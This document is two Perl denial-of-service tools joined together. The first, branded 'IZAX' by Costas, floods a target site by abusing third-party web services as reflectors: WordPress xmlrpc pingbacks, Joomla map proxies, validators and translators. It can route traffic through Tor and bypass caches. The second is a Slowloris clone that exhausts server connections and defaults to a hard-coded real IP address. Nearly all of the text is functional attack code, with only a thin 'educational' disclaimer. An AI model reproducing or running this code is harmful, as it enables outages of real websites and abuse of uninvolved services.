#!/usr/bin/perl
# Made by COSTAS.
#############################################
# Settings
my $version = "1.0.0"; # program version
my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
my $default_port = "80"; # default port of the host
my $show_stat = 1; # show statistic of work
my $default_site = ""; # default site for attack
my $testURL = "http://www.google.com"; # default site for testing botnet
open(my $list_servers = "/root/Desktop/list.txt"); # list of zombie-servers
my $mode = "1"; # 0 - standard mode, 1 - cyclic mode
my $cycles = "1000"; # number of cycles in cyclic mode
my $max_cycles = "1000"; # maximum number of cycles in cyclic mode
my $log = 1; # 0 - turn off, 1 - turn on logging
my $log_file = "logs.txt"; # log with results of work
my $cache = 0; # cache bypass
my $proxy = 0; # 1 - proxy, 1 - Socks proxy
my $proxyserver = "socks4 127.0.0.1"; # Socks server
my $proxyport = "9050"; # Socks port
#############################################
use IO::Socket;
use IO::Socket::Socks;

my (@list,$input,$site,$item,$servers,$cycle,$i,$req,$time,$time1,$time2,$speed,$speed2,$sec,$hour,$traffic);

if ($#ARGV >= 0) {
	for ($i=0;$i<=$#ARGV;$i++){
		if ($ARGV[$i] =~ /^u=(.+)$/) { # URL
			$site = $1;
		}
		elsif ($ARGV[$i] =~ /^test$/) { # test
			$site = "test";
		}
		elsif ($ARGV[$i] =~ /^l=(.+)$/) { # file with list
			$list_servers = $1;
		}
		elsif ($ARGV[$i] =~ /^m=(\d)$/) { # mode
			if ($1 == 1) {
				$mode = 1;
			}
			else {
				$mode = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^c=(\d+)$/) { # number of cycles
			$cycles = $1;
		}
		elsif ($ARGV[$i] =~ /^log=(\d)$/) { # logging
			if ($1 == 1) {
				$log = 1;
			}
			else {
				$log = 0;
			}
		}
		elsif ($ARGV[$i] =~ /^b=(\d+)$/) { # cache bypass
			if ($1 == 1) {
				$cache = 1;
			}
			else {
				$cache = 0;
			}
		}
	}
}

&Info;
open(FILE,"<$list_servers") || die "\nFile $list_servers not found.\n";
@list = <FILE>;
close(FILE);
foreach $item (@list) {
	chomp($item);
	if ($item && substr($item,0,1) ne "#") {
		$servers++;
	}
}
if (!$site) {
	print "Site: ";
	$input = <STDIN>;
	chomp($input);
	if (!$input) {
		$site = $default_site;
	}
	else {
		$site = $input;
	}
}
if ($site eq "test") {
	Logging("Test on $testURL") if $log;
	&Test;
}
$site =~ s/&/%26/g; # for correct work with zombie-servers
Logging("Attack on $site") if $log;

print "\nSite $site is attacking by $servers zombie-servers...\n\n";
$time1 = (time)[0] if $show_stat;
$cycles = 1 if (!$mode || $cycles < 1);
$cycles = $max_cycles if ($cycles > $max_cycles);
for ($cycle=0;$cycle<$cycles;$cycle++) {
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item && substr($item,0,1) ne "#") {
			print ++$i."\n";
			my ($url,$method,$file) = split /;/,$item;
			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
				if (open(FILE,"<$file")) {
					my $params = <FILE>;
					chomp($params);
					close(FILE);
					Attack($site,$url,$method,$params);
				}
				else {
					print "\nFile $file not found.\n"
				}
			}
			else {
				Attack($site,$url,$method);
			}
		}
	}
	$req += $i;
}
$time2 = (time)[0] if $show_stat;
print "\nAttack has been conducted.\n";
if ($show_stat) {
	$time = $time2-$time1;
	$time |= 1;
	$speed = $req/$time;
	$speed2 = length($traffic)/$time;
	$hour = int($time/360);
	$sec = $time%60;
	$sec = "0".$sec if ($sec<10);
	print "\nTime: ";
	if ($hour) {
		print "$hour:".(int($time/60)-$hour*60).":$sec.\n";
	}
	else {
		print int($time/60).":$sec.\n";
	}
	print "Requests: $req, Bytes: ".length($traffic).".\n";
	printf "Speed: %0.5f req/s, %0.5f B/s.\n",$speed,$speed2;
}

sub Info { # info
	print qq~
Made by Costas Use it carefully .
Stress testing - Project for IEK DELTA
The tool uses Tor's proxy 
Only for educational perpuses 

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMM                           MMMMM
MMMNM  MMMMM     IZAX    MMMMM  MMMMM
MMMNM  MMMMMMMN       NMMMMMMM  MMMMM
MMMNM  MMMMMMMMMNmmmNMMMMMMMMM  MMMMM
MMMNM  MMMMMMMMMMMMMMMMMMMMMMM  MMMMM
MMMNM  MMMMMMMMMMMMMMMMMMMMMMM  MMMMM
MMMNM  MMMMM   MMMMMMM   MMMMM  MMMMM
MMMNM  MMMMM   MMMMMMM   MMMMM  MMMMM
MMMNM  MMMNMMMMMMMMMMMMMMMMMMM  MMMMM
MMMNM  WMMMMMMMMMMMMMMMMMMMMMM  MMMMM
MMMMM  MMMNMMMMMMMMMMMMMMMMMMM  MMMMM
MMMMNM MMMMMMMMMMMMMMMMMMMMMMM MMMMMM
MMMMMMM  MMMMMMMMMMMMMMMMMMMM  MMMMMN
MMMMMMMMMM     IEK DELTA     MMMMMNMM
MMMMMMMMMMMM    COSTAS    MMMMMNMMNMM
MMMMNNMNMMMM  STEFANIDIS MMMMMNMMNMMM
MMMMMMMMNMMNMMMMMMMMMMMNMMNMNMMNMMNMM
~;
}

sub Attack { # send request to zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$port,$csrftoken,$cookie);

	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
	if ($cache) {
		$site .= "/" if ($site !~ /\/$/);
		if ($site =~ /\?/ || $site =~ /%3F/) {
			$site .= "%26" . int(rand(time));
		}
		else {
			$site .= "%3F" . int(rand(time));
		}
	}
	if ($method eq "WP") {
		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
		$host = $1;
		$page = $2;
	}
	else {
		$url =~ m|(https?://[^/]+)(/.+)?|;
		$host = $1;
		$page = $2;
	}
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	$host =~ s|^http://||;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif ($host eq "ping-admin.ru") {
		$cookie = &GetCookie($page);
	}
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	}
	if (!$sock) {
		print "- The Socket: $!\n";
		return;
	}
	if ($method eq "BYPASS") {
		$host =~ /^(www\.)?(.+)\.\w+$/;
		$site = "$2.$site";
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML" or $method eq "WP") {
		$params =~ s|http://site|$site|;
		if ($method eq "WP") {
			$params =~ s|http://source|$host|;
			$page .= "xmlrpc.php";
		}
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		if ($url =~ /xmlpserver/) {
			print $sock "Content-Type: text/xml;charset=UTF-8\n";
			print $sock "SOAPAction: \#replyToXML\n";
		}
		else {
			print $sock "User-Agent: $agent\n";
			print $sock "Accept: */*\n";
			print $sock "Content-Type: application/x-www-form-urlencoded\n";
		}
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		if ($url =~ m|^http://translate.yandex.net|) {
			print $sock "GET $page$site/ HTTP/1.1\n";
		}
		elsif ($page =~ m|"http://site|) {
			$page =~ s|"http://site|"$site|;
			print $sock "GET $page HTTP/1.1\n";
		}
		else {
			print $sock "GET $page$site HTTP/1.1\n";
		}
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	if ($show_stat) {
		if ($method eq "POST") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\n";
			$traffic .= "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
			$traffic .= "Cookie: $cookie\n" if $cookie;
			$traffic .= "Connection: close\n\n$params\r\n\r\n";
		}
		elsif ($method eq "XML" or $method eq "WP") {
			$traffic .= "POST $page HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nContent-Length: ". length($params) ."\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n$params\r\n\r\n";
		}
		else {
			$traffic .= "GET $page$site";
			$traffic .= "/" if ($url =~ m|^http://translate.yandex.net|);
			$traffic .= " HTTP/1.1\nHost: $host\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
		}
	}
}

sub Test { # test list of zombie-servers
	print "\nThe botnet with $servers zombie-servers is checking...\n\n";
	$i = 0;
	foreach $item (@list) {
		chomp($item);
		if ($item) {
			print ++$i." - ";
			my ($url,$method,$file) = split /;/,$item;
			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
				if (open(FILE,"<$file")) {
					my $params = <FILE>;
					chomp($params);
					close(FILE);
					TestServer($testURL,$url,$method,$params);
				}
				else {
					print "\nFile $file not found.\n"
				}
			}
			else {
				TestServer($testURL,$url,$method);
			}
		}
	}
	exit();
}

sub TestServer { # test zombie-server
	my $site = $_[0];
	my $url = $_[1];
	my $method = $_[2];
	my $params = $_[3];
	my ($sock,$host,$page,$content,$csrftoken,$cookie);

	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
	$site =~ s|://|/| if ($url =~ /proxy2974.my-addr.org/);
	if ($cache) {
		$site .= "/" if ($site !~ /\/$/);
		if ($site =~ /\?/ || $site =~ /%3F/) {
			$site .= "%26" . int(rand(time));
		}
		else {
			$site .= "%3F" . int(rand(time));
		}
	}
	if ($method eq "WP") {
		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
		$host = $1;
		$page = $2;
	}
	else {
		$url =~ m|(https?://[^/]+)(/.+)?|;
		$host = $1;
		$page = $2;
	}
	$page |= "/";
	$port = $1 if ($host =~ /:(\d+)$/);
	$port ||= $default_port;
	$host =~ s|^http://||;
	if ($host eq "browsershots.org") {
		$csrftoken = &GetCsrfToken;
	}
	elsif ($host eq "ping-admin.ru") {
		$cookie = &GetCookie($page);
	}
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "$host", ConnectPort => "$port");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
	}
	if (!$sock) {
		print "The Socket: $!\n";
		return;
	}
	if ($method eq "BYPASS") {
		$host =~ /^(www\.)?(.+)\.\w+$/;
		$site = "$2.$site";
	}
	if ($method eq "POST") {
		$params .= $site;
		$params .= "&csrfmiddlewaretoken=$csrftoken" if $csrftoken;
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Content-Type: application/x-www-form-urlencoded\n";
		print $sock "Cookie: csrftoken=$csrftoken\n" if $csrftoken;
		print $sock "Cookie: $cookie\n" if $cookie;
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	elsif ($method eq "XML" or $method eq "WP") {
		$params =~ s|http://site|$site|;
		if ($method eq "WP") {
			$params =~ s|http://source|$host|;
			$page .= "xmlrpc.php";
		}
		print $sock "POST $page HTTP/1.1\n";
		print $sock "Host: $host\n";
		if ($url =~ /xmlpserver/) {
			print $sock "Content-Type: text/xml;charset=UTF-8\n";
			print $sock "SOAPAction: \#replyToXML\n";
		}
		else {
			print $sock "User-Agent: $agent\n";
			print $sock "Accept: */*\n";
			print $sock "Content-Type: application/x-www-form-urlencoded\n";
		}
		print $sock "Content-Length: ". length($params) ."\n";
		print $sock "Connection: close\n\n";
		print $sock "$params\r\n\r\n";
	}
	else {
		if ($url =~ m|^http://translate.yandex.net|) {
			print $sock "GET $page$site/ HTTP/1.1\n";
		}
		elsif ($page =~ m|"http://site|) {
			$page =~ s|"http://site|"$site|;
			print $sock "GET $page HTTP/1.1\n";
		}
		else {
			print $sock "GET $page$site HTTP/1.1\n";
		}
		print $sock "Host: $host\n";
		print $sock "User-Agent: $agent\n";
		print $sock "Accept: */*\n";
		print $sock "Connection: close\r\n\r\n";
	}
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	if ($content =~ /HTTP\/\d.\d (\d\d\d)/){
		if ($1 >= 400){
			print "Error ($1)\n";
		}
		else {
			print "OK ($1)\n";
		}
	}
	else {
		print "Error\n";
	}
}

sub GetCsrfToken { # get CSRF token
	my ($sock,$content,$csrftoken);

	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "browsershots.org", ConnectPort => "80");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "browsershots.org", PeerPort => "80");
	}
	if (!$sock) {
		print "The Socket: $!\n";
		return;
	}
	print $sock "GET / HTTP/1.1\n";
	print $sock "Host: browsershots.org\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	$csrftoken = $1 if ($content =~ /name='csrfmiddlewaretoken' value='(.+?)'/);
	if ($show_stat) {
		$traffic .= "GET / HTTP/1.1\nHost: browsershots.org\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $csrftoken;
}

sub GetCookie { # get cookie
	my $url = $_[0];
	my ($sock,$content,@cookies,$cookie);

	$url =~ s/index.sema/free_seo\//;
	if ($proxy) {
		$sock = IO::Socket::Socks->new(ProxyAddr => "$proxyserver", ProxyPort => "$proxyport", ConnectAddr => "ping-admin.ru", ConnectPort => "80");
	}
	else {
		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "ping-admin.ru", PeerPort => "80");
	}
	if (!$sock) {
		print "The Socket: $!\n";
		return;
	}
	print $sock "GET $url HTTP/1.1\n";
	print $sock "Host: ping-admin.ru\n";
	print $sock "User-Agent: $agent\n";
	print $sock "Accept: */*\n";
	print $sock "Connection: close\r\n\r\n";
	$content = "";
	while (<$sock>) {
		$content .= $_;
	}
	while ($content =~ /Set-Cookie: (.+?=.+?); expires/g) {
		push(@cookies,$1);
	}
	$cookie = join("; ",@cookies);
	if ($show_stat) {
		$traffic .= "GET / HTTP/1.1\nHost: ping-admin.ru\nUser-Agent: $agent\nAccept: */*\nConnection: close\r\n\r\n";
	}
	return $cookie;
}

sub Logging { # Logging results of work
	my @months = ('01','02','03','04','05','06','07','08','09','10','11','12');
	my ($sec,$min,$hour,$day,$mon,$year) = (localtime(time))[0,1,2,3,4,5];
	$year += 1900;
	$sec = "0".$sec if ($sec<10);
	$min = "0".$min if ($min<10);
	$hour = "0".$hour if ($hour<10);
	$day = "0".$day if ($day<10);
	my $date = "$day.$months[$mon].$year $hour:$min:$sec";

	open(FILE, ">>$log_file");
	print FILE "$date;$_[0]\n";
	close(FILE);
}

sub CheckURL { # web sites which require "http" for target URL
	my $url = $_[0];

	return 1 if ($url =~ m|^http://regex.info|);
	return 1 if ($url =~ m|^http://anonymouse.org|);
	return 1 if ($url =~ m|^http://validator.w3.org|);
	return 1 if ($url =~ m|^http://www.netvibes.com|);
	return 1 if ($url =~ m|^http://services.w3.org|);
	return 1 if ($url =~ m|^http://proxy2974.my-addr.org|);
	return 1 if ($url =~ m|^http://dacd.win|);
	return 0;
}
#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($host) {
$host = 172.217.16.164;
print "Defaulting to host 172.217.16.164.\n";
  
}

unless ($port) {
    $port = 80;
    print "Defaulting to port 80.\n";
}

unless ($tcpto) {
    $tcpto = 2;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 1;
        print "Defaulting to a 1 second re-try timeout.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multithreading enabled.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No multithreading capabilites found!\n";
    print "Izax will be slower than normal as a result.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Connection successful, now comes the waiting game...\n";
        }
        else {
            print
"That's odd - I connected but couldn't send the data to $host:$port.\n";
            print "Is something wrong?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... I can't connect to $host:$port.\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFailed after $times[$i] seconds.\n";
        }
    }

    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. IZAX closed the socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at 
all...  you might have trouble using Slowloris against this target.  You can 
tweak the -timeout flag down to less than 10 seconds but it still may not 
build the sockets in time.
EOSUCKS2BU
    }
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Current stats:\tIZAX has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__

=head1 TITLE

IZAX by Costas.Made with love for IEK DELTA . 
Contact me here : izax@protonmail.com
Costas Izax
CYBER SEC
